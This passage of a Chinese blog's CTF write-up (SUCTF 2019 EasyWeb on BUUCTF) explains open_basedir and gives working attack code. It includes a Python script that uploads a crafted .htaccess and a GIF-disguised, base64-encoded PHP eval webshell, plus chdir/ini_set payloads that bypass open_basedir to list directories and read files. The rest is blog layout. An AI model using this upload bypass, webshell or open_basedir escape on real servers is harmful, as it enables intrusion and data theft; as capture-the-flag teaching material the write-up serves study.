+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">url=<span class="string">&quot;http://363894cb-b112-4e61-9727-779aad3c69fe.node3.buuoj.cn/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&quot;</span></span><br><span class="line">htaccess=<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">\x00\x00\x85\x48\x85\x18</span></span><br><span class="line"><span class="string">#define width 1</span></span><br><span class="line"><span class="string">#define height 1</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .pxp</span></span><br><span class="line"><span class="string">php_value auto_append_file  &quot;</span>php:<span class="comment">//filter/convert.base64-decode/resource=/var/www/html/upload/tmp_852aff287f54bca0ed7757a702913e50/2.pxp&quot;    </span></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">###这里需要替换为自己上传的文件名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shell=b&quot;</span>GIF89a<span class="string">&quot;+b&quot;</span>aa<span class="string">&quot;+base64.b64encode(b&quot;</span><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[cmd])<span class="meta">?&gt;</span><span class="string">&quot;) #aa为了满足base64算法凑足八个字节</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#first_upload ---- to upload .htaccess</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">files1=&#123;</span></span><br><span class="line"><span class="string">	&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">r1=requests.post(url=url,files=files1)</span></span><br><span class="line"><span class="string">print (r1.text)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#second_upload ---- to upload .shell</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">files2=&#123;</span></span><br><span class="line"><span class="string">	&#x27;file&#x27;:(&#x27;2.pxp&#x27;,shell,&#x27;image/jpeg&#x27;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">r1=requests.post(url,files=files2)</span></span><br><span class="line"><span class="string">print (r1.text)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="绕过open-basedir得到flag"><a href="#绕过open-basedir得到flag" class="headerlink" title="绕过open_basedir得到flag"></a>绕过open_basedir得到flag</h2><h3 id="什么是open-basedir"><a href="#什么是open-basedir" class="headerlink" title="什么是open_basedir"></a>什么是open_basedir</h3><p>Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。 一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。</p>
+<p>php可以读写的文件、目录都将被限制在这些目录中</p>
+<h3 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h3><p><a target="_blank" rel="noopener" href="https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/[](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)">https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/[](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a></p>
+<p>print_r(scandir(‘/var/www/html/F1AghhhhhhhhhhhhhHH’));</p>
+<p>print_r(file_get_contents(‘/var/www/html/F1AghhhhhhhhhhhhhHH’));</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));</span><br><span class="line"></span><br><span class="line">?cmd&#x3D;chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(file_get_contents(&#39;&#x2F;THis_Is_tHe_F14g&#39;));</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">uploads</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tanchiyu.top/2021/02/01/BUUCTF-21/">https://tanchiyu.top/2021/02/01/BUUCTF-21/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tanchiyu.top" target="_blank">Tcy👦♥QQ👧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/jwt%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88node-js%EF%BC%89/">jwt相关攻击|代码审计（node.js）</a><a class="post-meta__tags" href="/tags/CTFd-CVE%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9E/">CTFd CVE账户接管漏洞</a><a class="post-meta__tags" href="/tags/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/">无字母数字webshell</a><a class="post-meta__tags" href="/tags/%E7%BB%95%E8%BF%87open-basedir/">绕过open_basedir</a><a class="post-meta__tags" href="/tags/htaccess-%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6/">htaccess 绕过上传限制</a></div><div class="post_share"><div class="social-share" data-image="/image/ttt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/02/BUUCTF-22/"><img class="prev-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2021/02/01/%E7%A8%8B%E5%BA%8F%E7%BB%A7%E7%BB%AD/"><img class="next-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">程序继续</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">uploads</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">1.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%BB%E5%AD%A6%E5%AD%A6node-js"><span class="toc-number">1.1.</span> <span class="toc-text">去学学node.js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jwt-%E2%80%99none%E2%80%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">jwt.’none’绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V-amp-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B-HappyCTFd"><span class="toc-number">2.</span> <span class="toc-text">[V&amp;N2020 公开赛]HappyCTFd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFd%E8%B4%A6%E6%88%B7%E6%8E%A5%E7%AE%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">CTFd账户接管漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-EasyWeb"><span class="toc-number">3.</span> <span class="toc-text">[SUCTF 2019]EasyWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell"><span class="toc-number">3.1.</span> <span class="toc-text">无字母数字webshell+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess-%E7%BB%95%E8%BF%87%E4%B8%8A%E4%BC%A0%E9%99%90%E5%88%B6"><span class="toc-number">3.2.</span> <span class="toc-text">.htaccess 绕过上传限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8Eexif-imagetype-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">对于exif_imagetype()的绕过方式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.2.2.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87open-basedir%E5%BE%97%E5%88%B0flag"><span class="toc-number">3.3.</span> <span class="toc-text">绕过open_basedir得到flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFopen-basedir"><span class="toc-number">3.3.1.</span> <span class="toc-text">什么是open_basedir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.2.</span> <span class="toc-text">open_basedir绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.3.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackme靶场"/></a><div class="content"><a class="title" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场">hackme靶场</a><time datetime="2021-02-06T13:26:18.000Z" title="发表于 2021-02-06 21:26:18">2021-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场"/></a><div class="content"><a class="title" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场">Pikachu靶场</a><time datetime="2021-02-05T06:35:59.000Z" title="发表于 2021-02-05 14:35:59">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="工具学习"/></a><div class="content"><a class="title" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习">工具学习</a><time datetime="2021-02-05T03:48:26.000Z" title="发表于 2021-02-05 11:48:26">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/02/BUUCTF-22/" title="无题"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/02/02/BUUCTF-22/" title="无题">无题</a><time datetime="2021-02-02T03:00:17.000Z" title="发表于 2021-02-02 11:00:17">2021-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF21"/></a><div class="content"><a class="title" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21">BUUCTF21</a><time datetime="2021-02-01T06:14:07.000Z" title="发表于 2021-02-01 14:14:07">2021-02-01</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By uploads</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://tanchiyu.top/2021/02/01/BUUCTF-21/'
+    this.page.identifier = '2021/02/01/BUUCTF-21/'
+    this.page.title = 'BUUCTF21'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
